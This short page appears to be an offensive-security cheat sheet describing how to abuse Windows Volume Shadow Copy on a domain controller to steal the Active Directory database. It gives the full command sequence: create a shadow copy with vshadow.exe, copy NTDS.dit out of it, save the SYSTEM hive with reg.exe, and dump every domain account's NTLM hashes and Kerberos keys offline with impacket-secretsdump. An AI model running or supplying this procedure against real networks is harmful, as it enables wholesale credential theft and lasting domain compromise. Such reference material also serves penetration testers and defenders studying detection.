Shadow Copy

Shadow Copy (Volume Shadow Copy Service - VSS) is a Windows snapshot feature that can be abused to obtain a copy of the Active Directory database (NTDS.dit) and the SYSTEM registry hive. These files can then be extracted offline to recover NTLM hashes, Kerberos keys, and other credential material for every domain account. The technique is commonly used for credential dumping and long-term persistence.

Requirements

Local Administrator or Domain Administrator privileges on a Domain Controller.

Advantages

Extracts all domain credentials offline without directly accessing a live NTDS.dit database.

Disadvantages

Requires privileged access to a Domain Controller and VSS activity can be logged and detected.

Create Shadow Copy

vshadow.exe -nw -p C:

Copy NTDS.dit

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

Save SYSTEM Hive

reg.exe save hklm\system c:\system.bak

Extract Hashes Offline

impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
